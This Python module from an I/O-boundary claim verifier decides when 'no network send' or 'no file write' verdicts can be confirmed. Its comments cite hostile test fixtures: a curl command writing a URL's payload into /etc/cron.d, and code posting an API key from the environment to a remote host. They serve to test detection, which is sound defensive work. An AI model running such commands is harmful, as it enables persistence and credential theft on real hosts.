#: a human deciding whether to trust a verdict, so it names the libraries rather
#: than reporting a bare count — but a repo with 200 dependencies would otherwise
#: emit an unreadable wall, so the tail is summarised.
_MAX_REPORTED_UNCATALOGUED_MODULES = 5

#: Terminal id slots that mark a ``dst`` as leaving the repo. An external call is
#: the only thing that can BE an I/O primitive, so it is the only thing the catalog
#: is asked to adjudicate; an in-repo callee carries no catalog question.
#:
#: NOT A ``Symbol.kind`` SET, which is why it is not named one. The slot carries two
#: vocabularies: ``external_symbol`` is a registered ADR-0027 symbol kind (a minted
#: external node), while ``unresolved`` is the terminal token
#: :func:`ir.format_legacy_dst` hardcodes for an ``ExternalRef`` that never became a
#: node. Naming this ``_EXTERNAL_DST_KINDS`` made ``check-symbol-kind-drift``
#: correctly report ``unresolved`` as absent from the registry — the linter was
#: right and the name was wrong. That one slot spells two vocabularies is a real
#: oddity (INV-kurup's family: identifier-bearing fields emitting non-canonical
#: formats from several paths); it is recorded here, not fixed here.
_EXTERNAL_DST_TERMINAL_SLOTS: frozenset[str] = frozenset({
    "external_symbol",
    "unresolved",
})

#: Edge types that are a CALL SITE the catalog could have classified.
#:
#: DELIBERATELY NOT :data:`_COVERAGE_CALL_EDGE_TYPES`, which answers a different
#: question ("did the analyzer extract call structure for this language") and
#: therefore includes ``imports``. An import performs no I/O — ``import
#: requests`` is not a network send, ``requests.get(...)`` is — so counting
#: import edges here reports every module a repo merely MENTIONS as an
#: unexamined I/O risk. Measured on poetry: import edges alone contributed 231
#: of 258 reported modules. ``instantiates`` IS included because a constructor
#: is a genuine classification opportunity — ``socket.socket()`` is a catalogued
#: primitive.
_CALL_SITE_EDGE_TYPES: frozenset[str] = frozenset({
    "calls",
    "module_attr_ref",
    "instantiates",
})


def _analyzed_modules(raw_edges: list[dict[str, Any]]) -> set[str]:
    """Module-shaped names whose SOURCE this analysis actually read.

    Derived from the ``src`` side, which always names an in-repo symbol and so
    always carries a file path (``python:app/config.py:3-9:load:function``);
    the separator is normalised so ``app/config`` compares against a dotted
    ``app.config``. Nodes are not consulted — every analyzed file that
    participates in any edge appears here, and the function's callers already
    hold the edges.
    """
    analyzed: set[str] = set()
    from .taint import _module_from_symbol_path

    for edge in raw_edges:
        module = _module_from_symbol_path(edge.get("src", ""))
        if module:
            analyzed.add(module.replace("/", "."))
    return analyzed


def _is_analyzed_module(module: str, analyzed: set[str]) -> bool:
    """Whether ``module`` names source this analysis read.

    Tests every dotted prefix because the module slot may carry a trailing class
    name — ``app.config.Loader`` for a callee defined in ``app/config.py``.
    """
    parts = module.split(".")
    return any(".".join(parts[:i]) in analyzed for i in range(len(parts), 0, -1))


def _edge_dst_ref(edge: dict[str, Any]) -> Any:
    """The serialized edge's structured external target, or ``None``.

    WI-tihup put a richer ``dst_ref`` beside the colon-packed dst, and the
    tagger prefers it. The gate must prefer it too or the two disagree about
    which module a call names — which is the whole failure this reuse exists to
    prevent. Imported lazily because ``ir`` is heavy and only this path needs it.
    """
    raw = edge.get("dst_ref")
    if not raw:
        return None
    from .ir import ExternalRef

    return ExternalRef.from_dict(raw)


def _external_call_sites(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> Iterator[tuple[dict[str, Any], str, IoBoundaryCatalog]]:
    """Every call site this analysis made into an EXTERNAL, catalogued-language target.

    THE ONE DEFINITION OF THE POPULATION the coverage checks adjudicate, yielding
    ``(edge, dst, catalog)``. Extracted when a second consumer appeared
    (:func:`_opaque_launch_sites`) rather than after they drifted, because the
    drift is the documented failure mode here: INV-motos was two callers sharing
    one predicate but running it over DIFFERENT populations — the gate counted
    ``instantiates`` call sites the tagger could not tag — and no amount of
    sharing ``classify_call`` would have caught it. Sharing the predicate is not
    enough; the ITERATION has to be shared too.

    Three filters, each load-bearing:

    * ``_CALL_SITE_EDGE_TYPES`` — a call site the catalog could have classified,
      deliberately excluding ``imports`` (see that constant).
    * the five-slot id shape with an EXTERNAL terminal slot — a first-party
      callee's I/O was examined on its own edges, not here.
    * a catalog for the language — with none there is no adjudication to
      attempt, and the language is caught earlier by the INV-dabov check in
      :func:`compute_boundary_coverage`, which is derived rather than passed in
      precisely so this skip cannot fail open.
    """
    for edge in raw_edges:
        if edge.get("type") not in _CALL_SITE_EDGE_TYPES:
            continue
        dst = edge.get("dst", "")
        parts = dst.split(":")
        # lang:module:span:name:kind — a well-formed id has all five.
        if len(parts) < 5 or parts[-1] not in _EXTERNAL_DST_TERMINAL_SLOTS:
            continue
        catalog = catalogs.get(parts[0])
        if catalog is None:
            continue
        yield edge, dst, catalog


def _launch_site_name(edge: dict[str, Any], dst: str) -> str:
    """``module.name`` for a launch, spelled the way the catalogue branch spells it.

    Both branches of :func:`_opaque_launch_sites` feed one disclosure string, so
    they have to agree: the catalogue branch joins ``primitive.module`` and
    ``primitive.name``, and a bash launch of ``curl`` reads ``curl.curl`` from
    either side.

    ``dst_ref`` IS PREFERRED FOR THE SAME REASON :func:`_edge_dst_ref` EXISTS —
    WI-tihup put a structured target beside the colon-packed id and the tagger
    reads it, so a gate reading the slots instead is how the two come to
    disagree about what a call names. The slot fallback is not defensive
    padding: only bash stamps a boundary today and it always sets ``dst_ref``,
    but the stamp is a producer contract that the next producer to adopt it may
    satisfy without one, and a five-slot id is guaranteed here because
    :func:`_external_call_sites` already rejected anything shorter.
    """
    ref = _edge_dst_ref(edge)
    if ref is not None:
        return ".".join(part for part in (ref.module_path, ref.name) if part)
    parts = dst.split(":")
    return ".".join(part for part in (parts[1], parts[3]) if part)


def _opaque_launch_sites(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> list[str]:
    """Call sites where control leaves this process for a program we cannot see.

    INV-gahuz. The catalogue classified these calls CORRECTLY — ``subprocess.run``
    really is a subprocess primitive — and that is exactly why they were being
    read as examined negatives: :func:`_uncatalogued_external_modules` permits any
    call ``classify_call`` matches, which is right for every boundary that names
    a KNOWN surface and wrong for the one that names OPACITY. See
    :data:`~hypergumbo_core.io_boundary.OPAQUE_BOUNDARIES` for why ``subprocess``
    is the only such boundary a catalog can declare.

    MEASURED: ``subprocess.run(["curl", "-o", "/etc/cron.d/pwned", URL])`` returned
    ``confirmed`` rc 0 for both a ``fs_write`` and a ``net_send``
    ``must_not_exist`` claim, with ``open(f, "w")`` and ``socket.send`` controls
    returning ``violated`` rc 1 in the same session.

    TWO CHANNELS, ONE QUESTION (INV-larol). A catalogue is not the only thing
    that knows a call is a launch. The bash analyzer stamps
    ``meta.io_boundary = "command_launch"`` on an external-command edge because
    there is no bash catalogue to match against and ADR-0016 rules one out, so
    that stamp is the ONLY evidence of opacity those edges will ever carry.
    Consulting the catalogue alone left it unread. The producer stamp is
    therefore checked FIRST, before ``classify_call``: a catalogue row can
    classify a launch without describing it — ``curl -> net_send`` is right
    about the send and silent about the ``-o`` file write — and matching it is
    exactly what made the call an examined negative for every other boundary.

    Measured on the shipped CLI over a two-line script whose only command is
    ``curl -o /etc/cron.d/pwned <url>``, claim "never writes to the host
    filesystem": with no ``bash.yaml``, ``inconclusive`` rc 2; with six lines of
    ``curl -> net_send`` ``bash.yaml``, ``confirmed`` rc 0. Declaring
    ``subprocess`` alongside restored the refusal, which is the control showing
    the row matched and the BOUNDARY CHOICE — not the analyzer's sight —
    decided the verdict.

    Returns the QUALIFIED PRIMITIVE NAMES (``subprocess.run``), not the modules.
    A module name would be actively misleading here: the blocker is not that
    ``subprocess`` is uncatalogued — it is fully catalogued — but that this
    particular call hands control to something outside the analysis. Naming the
    call is also what makes the disclosure checkable against the source.
    """
    sites: set[str] = set()
    for edge, dst, catalog in _external_call_sites(raw_edges, catalogs):
        # THE PRODUCER CHANNEL, CHECKED BEFORE ``classify_call`` (INV-larol).
        # A catalogue row can CLASSIFY a launch without DESCRIBING it: a
        # ``curl -> net_send`` row is right about the send and silent about the
        # ``-o`` file write, and matching it is exactly what made the call an
        # examined negative for every other boundary. Asking the producer first
        # means a launch keeps its opacity no matter what a catalogue later
        # says about it, which is the difference between opacity being
        # structural and opacity being a favour the catalogue chooses to do.
        if (edge.get("meta") or {}).get("io_boundary") in PRODUCER_OPAQUE_BOUNDARIES:
            sites.add(_launch_site_name(edge, dst))
            continue
        primitive = classify_call(
            catalogs, dst, edge.get("meta"), dst_ref=_edge_dst_ref(edge),
        )
        if primitive is None:
            continue
        # ASKED OF THE CATALOGUE, NOT OF THE RETURNED BOUNDARY. ``classify_call``
        # yields ONE primitive, so a call catalogued under two boundaries is
        # reported under whichever row wins — and ``primitive.boundary in
        # OPAQUE_BOUNDARIES`` therefore misses a launch whose other row is
        # found first. The parity test over the registry caught exactly that on
        # Scala the first time it ran; see ``declares_opaque_crossing``.
        if not catalog.declares_opaque_crossing(primitive.module, primitive.name):
            continue
        # Joined rather than branched on a missing module: no shipped catalogue
        # has a moduleless subprocess row (checked across all 14), so an
        # ``if primitive.module`` branch would be dead code dressed as caution.
        sites.add(".".join(part for part in (primitive.module, primitive.name) if part))
    return sorted(sites)


def _uncatalogued_external_modules(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> list[str]:
    """Return the external modules this analysis called into and cannot adjudicate.

    THE PERMITTING CASE IS ENUMERATED, NOT THE BLOCKING ONE. A module supports
    a clean verdict when this catalogue has ENUMERATED its I/O surface —
    :meth:`IoBoundaryCatalog.module_io_is_enumerated`, a dated per-module audit
    recorded in ``stdlib_module_completeness``. Everything else is a module
    where "no ``net_send`` chains" means "none I could see". A denylist of
    known-risky libraries would fail open on the first library nobody had
    thought of, which is exactly how ``requests`` slipped through.

    TWO WEAKER TESTS USED TO STAND HERE AND BOTH FAILED OPEN, measured live on
    the shipped CLI with controls (INV-buzab P0, INV-zubuh P1):

    - ``is_stdlib_module(module)`` — name recognition against
      ``sys.stdlib_module_names``. ``telnetlib``, ``ssl`` and ``ctypes`` carry
      no catalogue row, and all three confirmed "never sends data over the
      network" for programs that respectively opened a telnet session, wrapped
      a socket, and shelled out through ``ctypes.CDLL("libc.so.6").system``.
    - row presence (``module == p.module or p.module.startswith(module + ".")``)
      — boundary-blind and surface-blind. ``os`` has 40 rows, so ``os`` counted
      as covered for EVERY boundary kind, including the ~30 I/O functions never
      enumerated: ``os.open`` + ``os.write`` confirmed "never writes to the
      host filesystem", and ``os.sendfile`` confirmed the network claim.

    The controls are what make those defects rather than blindness: in the same
    runs ``requests.post`` correctly returned ``inconclusive`` and
    ``os.makedirs`` / ``os.remove`` correctly returned ``violated``.

    THE STRICT DIRECTION IS AFFORDABLE BECAUSE IT CANNOT SUPPRESS A DETECTION.
    ``verify_claim`` returns ``violated`` outside the ``coverage.complete``
    branch, so coverage gates only the all-clear. Measured on four real repos
    (httpx, poetry, full-stack-fastapi-template, hypergumbo itself) every one
    was ALREADY ``inconclusive`` — 27 to 127 uncatalogued modules apiece — so
    tightening changed no verdict there. The cost falls on programs with no
    unadjudicable third-party module at all, which is precisely the population
    the false confirm endangered.

    SCOPE — the residual this deliberately leaves open. Only a dst that NAMES a
    module is counted. The bare ``external`` placeholder
    (``python:external:0-0:get:unresolved``, an untyped receiver) names none, so
    it is skipped: it is the largest edge population in a Python repo, it
    identifies no library to report, and counting it would downgrade nearly every
    repo to ``inconclusive`` while telling the reader nothing about what went
    unexamined. That population is the receiver-typing gap (INV-linub L3) and is
    tracked there, not laundered through this gate. The honest consequence — a
    repo reaching its I/O ONLY through untyped receivers still confirms — is
    pinned by ``test_untyped_receiver_population_is_the_disclosed_residual``.

    SECOND RESIDUAL, AND IT IS THE LARGER ONE. A language with no I/O catalogue
    is skipped here, and NOTHING downstream catches it for a boundary claim.
    This paragraph used to say the case was "already decided upstream
    (``is_supported`` / ``unsupported_taint_languages``)"; both halves are false
    for this command. ``cmd_verify_claims`` derives its supported set as
    ``languages & set(catalogs)`` and never consults ``is_supported``, and
    ``unsupported_taint_languages`` is populated only when the claims file
    carries a taint constraint. So the ``catalog is None`` skip below drops the
    language entirely. Reproduced on the shipped CLI with a 12-line Ruby fixture
    doing ``Net::HTTP.new(...).post(path, "key=#{ENV['API_KEY']}")``: both the
    ``net_send`` and ``fs_write`` claims return ``confirmed`` rc 0, with an empty
    ``unsupported_taint_languages`` and no disclosure of any kind — and the
    analyzer is not blind, it emits ``calls -> ruby:http:0-0:new:external_symbol``.
    Tracked separately; naming it here rather than asserting it away is the
    point, because a gate that mis-states its own scope is the shape of defect
    this function exists to correct.
    """
    # REUSED, NOT REIMPLEMENTED. Symbol-id module extraction already has six
    # homes and three different correct mechanisms (WI-ribuz), two of them naive
    # and wrong. ``_module_from_symbol_path`` is the one written for exactly this
    # comparison — an external dst's module against a catalog entry's declared
    # module (WI-damir) — including the ``""``-for-placeholder contract this
    # function's residual depends on. Adding a seventh home is how the drift
    # WI-ribuz files gets one entry longer. Imported inside the function because
    # ``taint`` is heavy and only this one path needs it.
    from .taint import _module_from_symbol_path

    analyzed = _analyzed_modules(raw_edges)
    unknown: set[str] = set()
    for edge, dst, catalog in _external_call_sites(raw_edges, catalogs):
        module = _module_from_symbol_path(dst)
        if not module:
            continue  # the placeholder — the disclosed residual above
        # (1) A CALL THE CATALOGUE CLASSIFIED WAS EXAMINED. That is what
        # examination IS, and it is asked through the same function the tagger
        # uses, so the gate cannot call a site unexamined that the tagging pass
        # just tagged. Answering this per-MODULE instead was measurably wrong:
        # a fixture calling ``json.dump(obj, fh)`` printed "calls into 2
        # module(s) with no I/O catalog coverage (builtins, json)" directly
        # above "2 fs_write chain(s) found" — through those very modules.
        if classify_call(catalogs, dst, edge.get("meta"),
                         dst_ref=_edge_dst_ref(edge)):
            continue
        # (2) AN UNMATCHED CALL IS AN EXAMINED NEGATIVE ONLY OVER AN ENUMERATED
        # MODULE. This is the smaller, honest remainder of the question, and it
        # replaced two branches that each answered something adjacent:
        # ``is_stdlib_module`` (does the interpreter ship this name — INV-buzab)
        # and row PRESENCE (did I catalogue ANY primitive here — INV-zubuh).
        # Each permitted a real exfiltration into a ``confirmed`` verdict.
        # Restoring either as a fallback restores the defect; there is none.
        if catalog.module_io_is_enumerated(module):
            continue
        # AN UNRESOLVED FIRST-PARTY CALLEE IS NOT A CATALOG GAP. Its source was
        # read, so whatever I/O it performs was examined on its own edges — it
        # is not a leaf this analysis cannot see past. Counting it would send a
        # repo with no third-party dependency at all to ``inconclusive`` on one
        # unresolved internal call. Measured on poetry: 120 of 171 call-site
        # modules were poetry's own.
        if _is_analyzed_module(module, analyzed):
            continue
        unknown.add(module)
    return sorted(unknown)


#: Edge types that count as a repo genuinely CALLING into a module, for the
#: method-starvation check. Deliberately excludes ``imports``: ``import
#: java.io.File`` performs no I/O and an unused import must not be read as
#: evidence that the analyzer went blind. The Kotlin case this check exists for
#: is caught anyway, because its evidence is a CALL edge (the constructor).
_STARVATION_CALL_EDGE_TYPES: frozenset[str] = frozenset({"calls"})


def method_starved_modules(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> list[str]:
    """External modules this analysis called into but could never have adjudicated.

    THE SINGLE ANSWER to "is this language's catalogued I/O structurally
    invisible", consumed by :func:`compute_boundary_coverage` so the boundary
    gate and the taint gate share one rule rather than growing a second copy.

    A catalogue entry declares its own call shape: ``java.io.File`` carries
    ``methods: [writeText, ...]``, so only a METHOD-construct call edge can ever
    match it, while ``kotlin.io.ConsoleKt`` carries ``functions: [println]``
    precisely because that receiver is compiler-synthesised and absent at AST
    level. So when a repo calls into a method-keyed module and the analyzer
    produced no method-construct edge for it, the catalogue was never given
    anything it could match — the analysis did not look.

    WHY NOT THE SIMPLER PREDICATES, measured before this one was written
    (``scripts/measure-blind-language-signal.py``, six fixtures):

    * "did the language emit ANY call edge" is the predicate this replaces; a
      Kotlin repo that writes a socket payload to disk emits five and passes.
    * "count only non-first-party dsts" does not discriminate at all, because
      :func:`is_first_party_callable_dst` requires an ABSOLUTE path slot and
      Kotlin's intra-repo dsts are relative.
    * "did the language emit any method-construct edge" catches the Kotlin case
      but also downgrades a pure-computation Python repo that simply calls
      nothing external — conflating "cannot see this language" with "this repo
      has no external calls". That blanket downgrade is the failure mode that
      made ``confirmed`` unreachable when this gate was first built, so the
      check is anchored on modules the repo ACTUALLY CALLS.

    Returns the sorted module names, so the caller can name them in a reason a
    human can act on rather than reporting a bare "coverage incomplete".
    """
    method_modules: dict[str, set[str]] = {
        language: {p.module for p in catalog.primitives if p.kind == "method"}
        for language, catalog in catalogs.items()
    }
    # ABSTAIN FOR ANY LANGUAGE THAT NEVER POPULATES ``call_construct``. Measured
    # on two real repos: Go stamps it 7,741 times (6,012 of them ``method``),
    # while JavaScript and TypeScript stamp it ZERO times across 2,995 call
    # edges. For those analyzers the field carries no information, so "no method
    # call landed in this module" is absence of evidence, not evidence of
    # blindness — and reporting it as blindness would downgrade every JS/TS repo
    # on earth, which is the blanket-downgrade failure mode this check is built
    # to avoid. ``None`` (could not check) is not ``empty`` (checked, found none).
    languages_with_construct_evidence: set[str] = {
        edge.get("src", "").split(":", 1)[0]
        for edge in raw_edges
        if (edge.get("meta") or {}).get("call_construct") and ":" in edge.get("src", "")
    }
    called: set[str] = set()
    satisfied: set[str] = set()
    for edge in raw_edges:
        if edge.get("type", "") not in _STARVATION_CALL_EDGE_TYPES:
            continue
        src = edge.get("src", "")
        if ":" not in src:
            continue
        language = src.split(":", 1)[0]
        if language not in languages_with_construct_evidence:
            continue
        modules = method_modules.get(language)
        if not modules:
            continue
        module = symbol_path_slot(edge.get("dst", ""))
        if not module or module not in modules:
            continue
        called.add(module)
        if (edge.get("meta") or {}).get("call_construct") == "method":
            satisfied.add(module)
    return sorted(called - satisfied)


def compute_boundary_coverage(
    raw_edges: list,
    supported_languages: set,
    catalogs: dict[str, IoBoundaryCatalog],
) -> BoundaryCoverage:
    """Decide whether the I/O boundary analysis can support a clean verdict.

    Coverage is derived from *call-edge production*, not from
    ``limits.skipped_languages`` (a dead field — WI-nihir) or from the bare
    fact that an analyzer pass ran (``analysis_runs`` records that a pass
    executed, not that it produced the call structure ``io_boundary`` needs).
    A supported language that was analyzed but emitted zero call edges (of
    :data:`_COVERAGE_CALL_EDGE_TYPES`) is *io-blind*: ``io_boundary`` tags I/O
    on call edges, so it saw none of that language's I/O (F69.A1).

    Args:
        raw_edges: Behavior-map edge dicts (``src`` / ``dst`` / ``type`` read).
        supported_languages: Languages present in the repo that have an I/O
            catalog (and could therefore have produced boundary chains).
        catalogs: Loaded I/O catalogs keyed by language. REQUIRED rather than
            defaulted: a safety gate that silently skips its own check when a
            caller forgets an argument fails open, which is the failure mode
            this function exists to prevent.

    Returns:
        ``BoundaryCoverage(complete=False, reason=...)`` when no call edges
        were produced at all, when a supported language produced none, or when
        the analysis called into modules the catalog cannot adjudicate;
        otherwise ``BoundaryCoverage(complete=True)``.
    """
    languages_with_calls: set[str] = set()
    total_call_edges = 0
    for edge in raw_edges:
        etype = edge.get("type", "")
        if etype not in _COVERAGE_CALL_EDGE_TYPES and not is_grpc_rpc_implementation(
            etype, edge.get("meta")
        ):
            continue
        total_call_edges += 1
        src = edge.get("src", "")
        if ":" in src:
            languages_with_calls.add(src.split(":", 1)[0])

    if total_call_edges == 0:
        return BoundaryCoverage(
            complete=False,
            reason=(
                "the analysis produced no call edges at all (empty, "
                "wrong directory, or unanalyzable input), so no I/O could "
                "be detected"
            ),
        )

    # INV-dabov: a language that CALLED into something and has no I/O
    # catalogue at all. Derived here rather than taken as an argument, for the
    # reason the ``catalogs`` docstring already gives: a safety gate a caller
    # can forget to arm fails open, and this one was unarmable — the language
    # never reaches ``supported_languages`` in the first place, because
    # ``cmd_verify_claims`` builds its catalogs dict under
    # ``if catalog.primitives:`` and drops an empty catalogue. The same
    # omission makes ``_uncatalogued_external_modules`` skip it on
    # ``catalog is None``. So the calls were seen, none could be classified,
    # and the verdict was ``confirmed``: reproduced on a 7-line Ruby fixture
    # posting ``ENV['API_KEY']`` to a remote host, rc 0, no disclosure.
    #
    # CALL-SCOPED, NOT REPO-SCOPED, and the distinction is the whole design.
    # Measured over six repos: keyed on languages PRESENT this would name up
    # to 16 apiece — markdown, gitignore, yaml, toml — and downgrade every
    # verdict for a .gitignore. Keyed on languages that emitted CALL EDGES it
    # names one to three real ones (bash on 6/6; +vue on pretix; +csharp,
    # solidity on hypergumbo, both of which are test fixtures). The honest
    # cost is disclosed rather than hidden: `bash` is universal on that
    # cohort, so until an io_primitives/bash.yaml exists this downgrades most
    # real repos to `inconclusive` — which is the correct answer for a tool
    # that cannot see what a shell script does.
    #
    # THIS COMMENT USED TO END "and is why the catalogue is the follow-up
    # rather than a scope exclusion here." That was WRONG, and wrong in the
    # dangerous direction, so it is corrected rather than left standing
    # (INV-larol). ADR-0016's implementation note rules a bash data-I/O
    # catalogue out — cataloguing `curl` as `net_send` attributes curl's
    # network activity to the shell script, and no clean invariant separates
    # `curl` from `git`. Measured on the shipped CLI, a two-line script whose
    # only command is `curl -o /etc/cron.d/pwned <url>`, claim "never writes to
    # the host filesystem": with no bash.yaml, `inconclusive` rc 2; with six
    # lines of `curl -> net_send` bash.yaml, `confirmed` rc 0. The row is
    # correct and the verdict it buys is a green tick over a write into a root
    # cron directory, because classifying a launch used to strip its opacity.
    # `_opaque_launch_sites` now consults the producer stamp, so a launch stays
    # opaque whatever a catalogue says — the follow-up this comment should have
    # named, and the one that makes any bash catalogue safe to consider.
    uncatalogued = sorted(languages_with_calls - set(catalogs))
    if uncatalogued:
        return BoundaryCoverage(
            complete=False,
            reason=(
                # No trailing conclusion: verify_claim appends "; cannot
                # confirm the boundary is unused." to whatever this returns,
                # and the first draft of this string said it too, so the
                # verdict read "...cannot confirm the boundary is unused;
                # cannot confirm the boundary is unused." Every other reason
                # here states only the CAUSE for the same reason.
                f"language(s) {', '.join(uncatalogued)} made calls but have "
                f"no I/O catalog, so none of their I/O could be classified"
            ),
        )

    blind = sorted(supported_languages - languages_with_calls)
    if blind:
        return BoundaryCoverage(
            complete=False,
            reason=(
                f"supported language(s) {', '.join(blind)} were analyzed but "
                f"produced no call edges, so their I/O is invisible to the "
                f"boundary analysis"
            ),
        )

    starved = method_starved_modules(raw_edges, catalogs)
    if starved:
        shown = ", ".join(starved[:_MAX_REPORTED_UNCATALOGUED_MODULES])
        more = len(starved) - _MAX_REPORTED_UNCATALOGUED_MODULES
        suffix = f" (+{more} more)" if more > 0 else ""
        return BoundaryCoverage(
            complete=False,
            reason=(
                f"the analysis calls into {len(starved)} module(s) whose "
                f"catalogued I/O is method-shaped ({shown}{suffix}) but produced "
                f"no method call edge for any of them, so their I/O is "
                f"structurally invisible"
            ),
        )

    # INV-gahuz: control leaves the process for a program whose I/O is not in
    # the edge set. Checked BEFORE the uncatalogued-module list below, and the
    # order is a deliberate courtesy rather than a tie-break: an uncatalogued
    # module is a gap the reader can CLOSE by cataloguing it, while an opaque
    # launch is categorical — no amount of cataloguing makes the launched
    # program visible. Reporting the fixable blocker first would send a reader
    # on an errand that cannot succeed, then move the goalpost on them.
    opaque = _opaque_launch_sites(raw_edges, catalogs)
    if opaque:
        shown = ", ".join(opaque[:_MAX_REPORTED_UNCATALOGUED_MODULES])
        more = len(opaque) - _MAX_REPORTED_UNCATALOGUED_MODULES
        suffix = f" (+{more} more)" if more > 0 else ""
        # DELIBERATELY NOT the "could not classify" wording used below: the
        # catalogue classified these exactly right, and blaming a missing row
        # would send the reader to add one that already exists. State the
        # opacity, which is the actual cause. No trailing conclusion —
        # ``verify_claim`` appends "; cannot confirm the boundary is unused."
        return BoundaryCoverage(
            complete=False,
            reason=(
                f"the analysis launches an external program at "
                f"{len(opaque)} call site(s) ({shown}{suffix}) and cannot see "
                f"what the launched program does, so whether this I/O happens "
                f"there was never examined"
            ),
        )

    unknown = _uncatalogued_external_modules(raw_edges, catalogs)
    if unknown:
        shown = ", ".join(unknown[:_MAX_REPORTED_UNCATALOGUED_MODULES])
        more = len(unknown) - _MAX_REPORTED_UNCATALOGUED_MODULES
        suffix = f" (+{more} more)" if more > 0 else ""
        # THE WORDING IS LOAD-BEARING AND THE OLD ONE BECAME FALSE. It said
        # "module(s) with no I/O catalog coverage", which was accurate while the
        # gate was blaming whole modules the catalogue had never heard of. The
        # gate now blames a module for the CALLS it could not classify, and
        # those modules often have extensive coverage — ``os`` carries 40 rows.
        # Measured on a fixture calling ``json.dump(obj, fh)``: the old string
        # printed "no I/O catalog coverage (builtins, json)" directly above
        # "2 fs_write chain(s) found", i.e. found THROUGH those very modules.
        # Naming the calls rather than the modules is also what makes the reason
        # actionable — it says what to catalogue.
        return BoundaryCoverage(
            complete=False,
            reason=(
                f"the analysis makes calls into {len(unknown)} module(s) that "
                f"the I/O catalog could not classify ({shown}{suffix}), so "
                f"whether those calls perform this I/O was never examined"
            ),
        )

    return BoundaryCoverage(complete=True)


def _default_coverage(boundary_map: BoundaryMap) -> BoundaryCoverage:
    """Coverage inferred from the boundary map alone, for direct callers that
    do not supply richer per-language coverage.

    An empty boundary map (no I/O edges at all) is treated as incomplete — a
    must_not_exist claim cannot be confirmed against an analysis that found no
    I/O whatsoever (INV-bitig). A non-empty map is treated as complete; the CLI
    supplies the stricter per-language signal that also catches a partially
    blind analysis (WI-kajil).
    """
    # INV-bitig gate: "did the analysis SEE any I/O at all?" — count BOTH
    # confirmed I/O (total_io_edges, real categories) AND the external_potential
    # bucket. The WI-huhit/WI-foduh headline redefine excludes external_potential
    # from total_io_edges, but external_potential>0 still means the analysis ran
    # and found (receiver-unresolved) calls, so it is NOT an unanalyzed input;
    # this gate keeps the original "any boundary signal" semantics.
    if (
        boundary_map.total_io_edges == 0
        and boundary_map.external_potential_edges == 0
    ):
        return BoundaryCoverage(
            complete=False,
            reason=(
                "the boundary analysis found no I/O edges at all, so a clean "
                "verdict cannot be distinguished from an unanalyzed input"
            ),
        )
    return BoundaryCoverage(complete=True)


def verify_claim(
    claim: Claim,
    boundary_map: BoundaryMap,
    coverage: Optional[BoundaryCoverage] = None,
) -> ClaimVerdict:
    """Verify a single boundary-constraint claim against a boundary map.

    Args:
        claim: The claim to verify.
        boundary_map: The I/O boundary map to check against.
        coverage: Whether the boundary analysis is trustworthy enough to
            *confirm* a clean (zero-chain / within-limit) verdict. When
            ``None``, coverage is inferred from the map alone
            (:func:`_default_coverage`); the CLI always supplies the stricter
            per-language signal. When coverage is incomplete, a would-be
            ``confirmed`` verdict is downgraded to ``inconclusive`` so the tool
            never asserts a boundary is unused on an analysis that couldn't see
            it (WI-kajil / INV-bitig P0). Coverage never affects ``violated``
            verdicts: found evidence is positive regardless of blind spots.

    Returns:
        ClaimVerdict with the result.
    """
    if coverage is None:
        coverage = _default_coverage(boundary_map)

    entry = boundary_map.entries.get(claim.constraint_boundary)
    chain_count = len(entry.chains) if entry else 0

    # Check must_not_exist constraint
    if claim.constraint_must_not_exist:
        if chain_count == 0:
            if not coverage.complete:
                return ClaimVerdict(
                    claim_id=claim.id,
                    claim_text=claim.text,
                    verdict="inconclusive",
                    details=(
                        f"No {claim.constraint_boundary} chains found, but "
                        f"{coverage.reason}; cannot confirm the boundary is "
                        f"unused."
                    ),
                )
            return ClaimVerdict(
                claim_id=claim.id,
                claim_text=claim.text,
                verdict="confirmed",
                details=f"No {claim.constraint_boundary} chains found.",
            )
        return ClaimVerdict(
            claim_id=claim.id,
            claim_text=claim.text,
            verdict="violated",
            evidence_count=chain_count,
            details=(
                f"{chain_count} {claim.constraint_boundary} chain(s) found, "
                f"but claim requires none."
            ),
        )

    # Check max_chains constraint
    if claim.constraint_max_chains is not None:
        if chain_count <= claim.constraint_max_chains:
            if not coverage.complete:
                return ClaimVerdict(
                    claim_id=claim.id,
                    claim_text=claim.text,
                    verdict="inconclusive",
                    details=(
                        f"{chain_count} {claim.constraint_boundary} chain(s) "
                        f"found, within limit of {claim.constraint_max_chains}, "
                        f"but {coverage.reason}; cannot confirm the limit holds."
                    ),
                )
            return ClaimVerdict(
                claim_id=claim.id,
                claim_text=claim.text,
                verdict="confirmed",
                details=(
                    f"{chain_count} {claim.constraint_boundary} chain(s) found, "
                    f"within limit of {claim.constraint_max_chains}."
                ),
            )
        return ClaimVerdict(
            claim_id=claim.id,
            claim_text=claim.text,
            verdict="violated",
            evidence_count=chain_count,
            details=(
                f"{chain_count} {claim.constraint_boundary} chain(s) found, "
                f"exceeds limit of {claim.constraint_max_chains}."
            ),
        )

    # No constraint matched — inconclusive (ADR-0033 Phase 3 PR4 /
    # WI-rolol sub-task A). Previously fell through to verdict="confirmed"
    # with details="No constraint to check.", silently confirming claims
    # that had no machinery to verify them (INV-bitig P0).
    return ClaimVerdict(
        claim_id=claim.id,
        claim_text=claim.text,
        verdict="inconclusive",
        details=(
            "No machine-checkable constraint on this claim. The claim "
            "may be true, but verify-claims has nothing to assert against."
        ),
    )


def _flow_identity(v: "TaintFlowFinding") -> tuple[Any, ...]:
    """Full per-flow identity of a taint finding (WI-kikis).

    Two findings are "the same flow" iff their source/sink symbols, primitive
    names, and call-graph path all match — so verbatim-duplicate findings
    collapse while flows that merely share a primitive NAME (distinct symbols)
    stay distinct.
    """
    return (
        v.source_primitive,
        v.source_symbol,
        v.sink_primitive,
        v.sink_symbol,
        tuple(v.path),
    )


def _render_flow(v: "TaintFlowFinding") -> str:
    """Render one violating flow with its drill-down identity (WI-kikis):
    ``<source_primitive> [<source_symbol>] -> <sink_primitive> [<sink_symbol>]``
    plus a hop count when the path routes through intermediate nodes."""
    row = (
        f"{v.source_primitive} [{v.source_symbol}] -> "
        f"{v.sink_primitive} [{v.sink_symbol}]"
    )
    # path = [source, ...intermediate..., sink]; hops are the interior nodes.
    if len(v.path) > 2:
        row += f" via {len(v.path) - 2} hop(s)"
    return row


